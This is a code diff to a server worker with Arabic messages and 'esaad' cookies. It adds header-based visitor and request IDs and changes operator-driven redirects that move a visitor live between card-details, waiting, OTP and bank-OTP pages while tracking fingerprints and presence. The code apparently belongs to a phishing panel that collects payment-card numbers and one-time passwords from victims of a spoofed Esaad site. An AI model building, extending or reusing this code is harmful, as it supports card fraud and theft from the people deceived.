@@ -459,8 +459,10 @@ export default {
 
         const fpKey = getFingerprintKey(request);
         const fpSession = ipToSessionMap.get(fpKey);
-        const clientId = url.searchParams.get('clientId') || cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
-        const requestId = url.searchParams.get('requestId') || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID();
+        const hdrCid = request.headers.get('x-client-id')?.trim();
+        const hdrReqId = request.headers.get('x-request-id')?.trim();
+        const clientId = url.searchParams.get('clientId') || hdrCid || cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
+        const requestId = url.searchParams.get('requestId') || hdrReqId || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID();
         const currentPage = url.searchParams.get('page') || '/';
         const now = Date.now();
         const meta = extractVisitorMeta(request);
@@ -499,8 +501,11 @@ export default {
         const fpSession = ipToSessionMap.get(fpKey);
         const now = Date.now();
 
+        const hdrCid = request.headers.get('x-client-id')?.trim();
+        const hdrReqId = request.headers.get('x-request-id')?.trim();
         const clientId = String(
           body?.clientId ||
+            hdrCid ||
             cookies.esaad_cid ||
             (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.clientId : '') ||
             crypto.randomUUID()
@@ -512,6 +517,7 @@ export default {
           ? null
           : String(
               body?.requestId ||
+                hdrReqId ||
                 cookies.esaad_req_id ||
                 existingDevice?.requestId ||
                 (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.requestId : '') ||
@@ -730,7 +736,7 @@ export default {
       // 6. GET /api/requests/current
       if (pathname === '/api/requests/current' && method === 'GET') {
         const fpSession = ipToSessionMap.get(getFingerprintKey(request));
-        const id = cookies.esaad_req_id || fpSession?.requestId;
+        const id = request.headers.get('x-request-id')?.trim() || cookies.esaad_req_id || fpSession?.requestId;
         if (!id) {
           return jsonResponse({ error: 'لا يوجد طلب نشط' }, 404);
         }
@@ -770,7 +776,13 @@ export default {
           const body: any = await request.json().catch(() => ({}));
           const fpSession = ipToSessionMap.get(getFingerprintKey(request));
           const now = new Date().toISOString();
-          const id = String(body?.id || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID());
+          const id = String(
+            body?.id ||
+              request.headers.get('x-request-id')?.trim() ||
+              cookies.esaad_req_id ||
+              fpSession?.requestId ||
+              crypto.randomUUID()
+          );
           const meta = extractVisitorMeta(request);
 
           const newRecord: RequestRecord = {
@@ -813,7 +825,10 @@ export default {
       if (pathname.startsWith('/api/requests/')) {
         const rawParam = decodeURIComponent(pathname.slice('/api/requests/'.length));
         const fpSession = ipToSessionMap.get(getFingerprintKey(request));
-        const id = rawParam === 'current' ? cookies.esaad_req_id || fpSession?.requestId : rawParam;
+        const id =
+          rawParam === 'current'
+            ? request.headers.get('x-request-id')?.trim() || cookies.esaad_req_id || fpSession?.requestId
+            : rawParam;
         if (!id) {
           return jsonResponse({ error: 'معرف الطلب غير متوفر' }, 400);
         }
@@ -843,12 +858,17 @@ export default {
             updatedAt: now
           };
 
+          const targetRoute =
+            body?.nextAction !== undefined ? normalizeRedirectTarget(body.nextAction) : null;
+
           if (body?.nextAction !== undefined) {
-            const targetRoute = normalizeRedirectTarget(body.nextAction);
             if (targetRoute) {
               pendingRedirects.set(id, targetRoute);
               lastKnownUserPage.set(id, targetRoute);
               patchPayload.step = targetRoute;
+              if (targetRoute !== '/card-details' && body?.otpStatus === undefined) {
+                patchPayload.otpStatus = '';
+              }
               const existingPresence = userPresence.get(id);
               if (existingPresence) {
                 userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
@@ -856,7 +876,12 @@ export default {
             } else {
               pendingRedirects.delete(id);
             }
-          } else if (body?.step === 'card' || body?.step === 'otp' || body?.step === 'otp-bank') {
+          }
+
+          if (
+            !targetRoute &&
+            (body?.step === 'card' || body?.step === 'otp' || body?.step === 'otp-bank')
+          ) {
             pendingRedirects.delete(id);
             const stepPage = body.step === 'card' ? '/waiting' : body.step === 'otp-bank' ? '/otp-bank' : '/otp';
             explicitlyOfflineIds.delete(id);
